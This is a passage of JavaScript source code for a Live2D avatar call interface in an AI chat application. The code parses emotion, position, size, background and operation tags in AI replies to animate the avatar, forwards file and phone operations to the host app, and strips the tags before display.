    angry: { browL: -0.9, browR: -0.9, eyeL: 0.75, eyeR: 0.75, mouth: 0.4 },
    shy: { cheek: 0.9, smile: 0.5, eyeL: 0.6, eyeR: 0.6 },
    surprised: { browL: 0.6, browR: 0.6, eyeL: 1.5, eyeR: 1.5, mouth: 0.8 },
    cry: { browL: -0.6, browR: -0.6, eyeL: 0.5, eyeR: 0.5, mouth: 0.3 },
    think: { browL: 0.5, browR: -0.5, eyeL: 0.6, eyeR: 0.6 },
    dizzy: { eyeL: 0.3, eyeR: 0.3, mouth: 0.5 },
    calm: { smile: 0.3 },
  };

  // 把情绪参数组叠加到当前模型（在 exp 表情应用完成后再调用，避免被复位清掉）
  function applyEmotionParams(emotionKey) {
    const set = EMOTION_PARAM_SETS[emotionKey];
    if (!set) return;
    const cm = model?.internalModel?.coreModel;
    if (!cm || typeof cm.setParameterValueById !== 'function') return;
    const applied = [];
    const missing = [];
    for (const [slot, val] of Object.entries(set)) {
      const pid = resolveParamId(slot);
      if (!pid) { missing.push(slot); continue; }
      const prev = typeof cm.getParameterValueById === 'function' ? Number(cm.getParameterValueById(pid) || 0) : 0;
      try { cm.setParameterValueById(pid, Math.max(-1, Math.min(1.5, Number(val)))); } catch { continue; }
      applied.push({ id: pid, prev });
    }
    if (applied.length) currentExpParams.push(...applied);
    if (missing.length) console.warn('[Live2D] 该模型没有这些情绪参数槽，已跳过：', missing.join(', '));
  }

  function driveEmotion(name) {
    const input = String(name || '').trim();
    if (!input) return false;
    let emoKey = null;
    let emo = null;
    const lower = input.toLowerCase();
    if (EMOTION_MAP[lower]) {
      emoKey = lower;
      emo = EMOTION_MAP[lower];
    } else {
      for (const [k, v] of Object.entries(EMOTION_MAP)) {
        if (k === input || v.exp === input || v.keys.some(w => w === input)) { emoKey = k; emo = v; break; }
      }
    }
    if (!emo) {
      console.warn('[Live2D] 未知情绪:', input);
      return false;
    }
    mouthEnergy = emo.energy;
    // 关键：参数组按「情绪键」查（happy/sad/surprised/calm…），不能按 exp 文件名键查。
    // 否则 surprised 的 exp 是 dizzy 会错套"晕"的参数组、calm 的 exp 是 smile 会直接查不到。
    void setExpression(emo.exp).then(() => applyEmotionParams(emoKey));
    console.log('[Live2D] 情绪:', input, '→', emoKey, '(exp:', emo.exp + ')', 'energy', emo.energy);
    return true;
  }

  // 自动情绪推断：文本含触发词/emoji 时推断情绪（无显式标签时兜底）
  function inferEmotionFromText(text) {
    if (!text) return null;
    const t = String(text);
    for (const [key, v] of Object.entries(EMOTION_MAP)) {
      for (const w of v.keys) {
        if (t.includes(w)) return key;
      }
    }
    return null;
  }

  // 位置标签：[位置:left|center|right|上|中|下] —— 临时移动，不覆盖用户记忆
  function setModelPositionByTag(v) {
    const val = String(v || '').trim();
    if (val === 'left' || val === '左') resizeState.cx = 0.25;
    else if (val === 'right' || val === '右') resizeState.cx = 0.75;
    else if (val === 'center' || val === '中' || val === '中间') resizeState.cx = 0.5;
    else if (val === 'top' || val === '上') resizeState.cy = 0.25;
    else if (val === 'bottom' || val === '下') resizeState.cy = 0.85;
    else return;
    applyModelSize();
  }

  // 大小标签：[大小:大|小|特大|特小|65%] —— 临时缩放，不覆盖用户记忆
  function setModelSizeByTag(v) {
    const val = String(v || '').trim();
    let factor = null;
    if (val === '特大' || val === 'huge') factor = 1.5;
    else if (val === '大' || val === 'big' || val === 'large') factor = 1.2;
    else if (val === '小' || val === 'small') factor = 0.8;
    else if (val === '特小' || val === 'tiny') factor = 0.6;
    else if (/^\d+(\.\d+)?%$/.test(val)) {
      const u = modelUnitBounds();
      if (u && u.h > 0 && app) {
        const target = clampScale((parseFloat(val) / 100) * app.screen.height / u.h);
        factor = target / resizeState.sx;
      }
    }
    if (factor) {
      resizeState.sx = clampScale(resizeState.sx * factor);
      resizeState.sy = clampScale(resizeState.sy * factor);
      applyModelSize();
    }
  }

  // 背景预设名 → 值（与设置页色块一致，供 [背景:xxx] 标签切换）
  const BG_PRESETS = {
    '深蓝': 'linear-gradient(135deg,#0f2027,#203a43,#2c5364)',
    '蓝紫': 'linear-gradient(135deg,#2b5876,#4e4376)',
    '星空': 'linear-gradient(135deg,#0f0c29,#302b63,#24243e)',
    '紫罗兰': 'linear-gradient(135deg,#8e2de2,#4a00e0)',
    '红蓝': 'linear-gradient(135deg,#fc466b,#3f5efb)',
    '深黑': '#0b0e14',
    '墨蓝': '#1a1a2e',
    '深紫': '#533483',
    '玫红': '#e94560',
    '青绿': '#0e8388',
  };

  // Agent 操作：[操作:xxx] —— 触发应用功能（打开/关闭视频通话、整理记忆等）
  function handleAgentOperation(name) {
    const v = String(name || '').trim();
    if (!v) return;
    if (/打开|开始|进入/.test(v) && /视频通话|通话|live2d/i.test(v)) { window.agentActions?.openVideoCall(); return; }
    if (/关闭|结束|挂断/.test(v) && /视频通话|通话|live2d/i.test(v)) { window.agentActions?.closeVideoCall(); return; }
    if (/整理记忆|记忆整理/.test(v)) { window.agentActions?.organizeMemory(); return; }
    // 手机操作（[操作:手机点击 500 800] 等）：转发主应用，由 Agent 运行时统一做
    // 「停止检查 + 敏感操作授权」，结果回填对话。执行层是否可用由主应用判断。
    if (/^(手机|设备)/.test(v)) {
      if (window.agentActions?.agentPhoneOperation) window.agentActions.agentPhoneOperation(v);
      else console.warn('[Live2D] 主应用手机操作不可用');
      return;
    }
    // 文件操作（权限模式由设置控制，转发主应用执行并把结果回填对话）
    if (/列出文件|列出目录|查看文件夹|查看文件|读取文件|保存文件|写入文件|创建文件|新建文件/.test(v)) {
      if (window.agentActions?.agentFileOperation) window.agentActions.agentFileOperation(v);
      else console.warn('[Live2D] 主应用文件操作不可用');
      return;
    }
    if (/隐藏水印|去掉水印|水印隐藏|去水印/.test(v)) { if (!watermarkOn) void toggleWatermark(); return; }
    if (/显示水印|恢复水印|水印显示/.test(v)) { if (watermarkOn) void toggleWatermark(); return; }
    if (/静音|静音AI/.test(v) && !/取消|解除/.test(v)) { if (!aiVoiceMuted) toggleMute(); return; }
    if (/取消静音|解除静音|打开声音|恢复声音/.test(v)) { if (aiVoiceMuted) toggleMute(); return; }
    console.warn('[Live2D] 未知操作:', v);
  }

  // 取同类标签里最后一个。
  // 旧实现用非全局正则 match()，一条回复里出现两个同类标签时只有第一个被处理
  // （[操作:] 在修 8.7 时已改成全局，其它标签没跟上，导致行为不一致）。
  // 统一为"最后一个生效"：既不会漏，也避免同类标签重复触发请求造成并发竞态。
  function lastTagValue(text, name) {
    const re = new RegExp('\\[' + name + '[:：]\\s*([^\\]]+)\\]', 'g');
    let v = null, m;
    while ((m = re.exec(text)) !== null) v = m[1].trim();
    return v;
  }

  // 统一入口：解析回复中的标签并驱动模型（表情/动作/情绪/位置/大小/背景/操作）
  function driveText(text) {
    if (!text) return;
    const t = String(text);

    const expName = lastTagValue(t, '表情');
    if (expName) void setExpression(expName);
    const motionName = lastTagValue(t, '动作');
    if (motionName) void playMotion(motionName);

    // 显式情绪优先。
    // ⚠️ 这里以前是 `driveEmotion(...); return;`，会把下面所有标签一起跳过——
    // 而系统提示词要求 AI 每条回复都带一个情绪标签，结果 [位置]/[大小]/[背景]/[操作]
    // （文件操作、打开通话、静音、隐藏水印）几乎永远不会被执行，且因为标签不显示给用户，
    // 从表面完全看不出来。现在只把「跳过自动推断」这一件事交给这个标志，不再提前返回。
    const emoName = lastTagValue(t, '情绪');
    const explicitEmotion = emoName ? (driveEmotion(emoName) !== false) : false;

    const pos = lastTagValue(t, '位置');
    if (pos) setModelPositionByTag(pos);
    const size = lastTagValue(t, '大小');
    if (size) setModelSizeByTag(size);
    const bg = lastTagValue(t, '背景');
    if (bg) {
      const value = BG_PRESETS[bg] || bg;
      if (window.Live2DCall?.setBackground) window.Live2DCall.setBackground(value);
    }
    // 操作标签：支持一条回复里出现多个（例如同时「打开视频通话」+「隐藏水印」）
    const ops = t.match(/\[操作[:：]\s*[^\]]+\]/g) || [];
    for (const raw of ops) {
      const inner = raw.replace(/^\[操作[:：]\s*/, '').replace(/\]$/, '').trim();
      if (inner) handleAgentOperation(inner);
    }

    // 没有显式表情、也没有识别成功的显式情绪时，才按触发词自动推断
    if (!expName && !explicitEmotion) {
      const inferred = inferEmotionFromText(t);
      if (inferred) driveEmotion(inferred);
    }
  }

  function playRandomMotion() {
    const keys = Object.keys(MOTION_MAP);
    const next = keys[Math.floor(Math.random() * keys.length)];
    void playMotion(next);
  }

  let aiVoiceMuted = false;
  function toggleMute() {
    aiVoiceMuted = !aiVoiceMuted;
    if (aiVoiceMuted) {
      // 静音 AI 声音：停止嘴动
      stopMouth();
    }
    syncMuteHint();
  }

  // ===== 真实语音输入（复用主应用的录音 + ASR + 发送流程） =====
  function toggleTalk() {
    if (typeof window.handleMicClick === 'function') {
      window.handleMicClick();
    } else {
      console.warn('[Live2D] 主应用语音输入不可用');
    }
  }

  function onVoiceStateEvent(e) {
    const detail = e?.detail || {};
    const btn = document.getElementById('live2d-talk-btn');
    if (!btn) return;
    const st = detail.state || 'idle';
    if (st === 'listening') {
      btn.textContent = '🎤 聆听中…';
      btn.classList.add('listening');
      btn.title = '正在聆听，说完再点一次发送';
    } else if (st === 'paused') {
      btn.textContent = '🎤 已暂停';
      btn.classList.remove('listening');
      btn.title = '再次点击结束并发送';
    } else {
      btn.textContent = '🎤 说话';
      btn.classList.remove('listening');
      btn.title = '语音输入：点击开始说话，说完再点一次发送';
    }
  }
  window.addEventListener('voice-state', onVoiceStateEvent);

  // ===== 对外 API =====
  window.Live2DCall = {
    open, close,
    setBackground: function (v) {
      const safe = sanitizeBackground(v);
      bgStyle = safe;
      try { localStorage.setItem("live2d.bg", safe); } catch { /* ignore */ }
      applyBackground();
    },
    getBackground: function () { return bgStyle; },
    deleteModel,
    // 供设置页在"重命名模型"之后刷新通话界面的下拉，并迁移按模型名存设置
    applyRenamedModel,
    toggleMute,
    toggleTalk,
    setExpression,
    playMotion,
    driveEmotion,
    toggleAdjustBox,
    // 鼠标跟随开关（设置 → Live2D）
    setMouseFollow,
    isMouseFollow() { return mouseFollowEnabled; },
    // 鼠标跟随幅度（0-100，10 = 原始幅度 = 1.0 倍）
    setMouseFollowScale,
    getMouseFollowScale() { return mouseFollowScale; },
    getMouseFollowScaleMax() { return MOUSE_SCALE_MAX; },
    // 幅度信息：告诉设置面板"该模型的头部在 ×N 就到量程上限了"。
    // 头部幅度被模型自身参数范围锁死，超过这个倍率只有身体跟随还会继续变大。
    getFollowAmpInfo() {
      const cm = model?.internalModel?.coreModel;
      if (!cm) return { loaded: false };
      const sat = headSaturateK(cm);
      return {
        loaded: true,
        headSaturateAt: Number.isFinite(sat) ? Math.round(sat * 10) / 10 : null,
        bodyParamCount: resolveParamIds('bodyX').length + resolveParamIds('bodyY').length,
      };
    },
    // 静音时不应再动嘴（主应用也会跳过 TTS 播放，这里是双保险）
    speakStart() { if (aiVoiceMuted) return; startMouth(); },
    speakEnd() { stopMouth(); },
    // 供主应用查询静音状态：静音 = 不播放 AI 语音（[操作:静音]）
    isVoiceMuted() { return aiVoiceMuted; },
    drive: driveText,
    // 当前模型可用表情/动作（只给文件名，不带目录与扩展名），供主应用注入提示词让 AI 决策。
    // 清单内部存的是「相对模型根目录的路径」，这里剥成 AI 认识的名字
    // （AI 该说"脸红"，而不是"exp/脸红.exp3.json"）；同名文件去重，避免提示词里出现重复项。
    getAvailableExpressions() {
        const names = (list, ext) => {
            const out = [];
            for (const f of list) {
                const base = f.split('/').pop().replace(new RegExp('\\.' + ext + '\\.json$', 'i'), '');
                if (base && !out.includes(base)) out.push(base);
            }
            return out;
        };
        return {
            exps: names(currentModelExps, 'exp3'),
            motions: names(currentModelMotions, 'motion3')
        };
    },
    // 当前模型是否带水印开关（供提示词提示 AI 用 [操作:隐藏水印]）
    hasWatermark() { return Boolean(watermarkExp); },
    stripTags(text) {
      return String(text || '')
        .replace(/\[表情[:：][^\]]*\]/g, '')
        .replace(/\[动作[:：][^\]]*\]/g, '')
        .replace(/\[情绪[:：][^\]]*\]/g, '')
        .replace(/\[位置[:：][^\]]*\]/g, '')
        .replace(/\[大小[:：][^\]]*\]/g, '')
        .replace(/\[背景[:：][^\]]*\]/g, '')
        .replace(/\[操作[:：][^\]]*\]/g, '')
        .replace(/\[任务[:：][^\]]*\]/g, '')
        .trim();
    },
    isOpen() { return isOpen; },
    // 真实语音音量 → 嘴型（VAD 简化）：0~1 音量；传 null/0 恢复正弦波并停嘴
    setVoiceEnergy(level) {
      if (level == null || Number(level) < 0.015) {
        voiceEnergy = null;
        if (speaking) stopMouth();
        return;
      }
      voiceEnergy = Math.min(1.5, Number(level));
      if (!speaking) startMouth();
    },
  };
})();
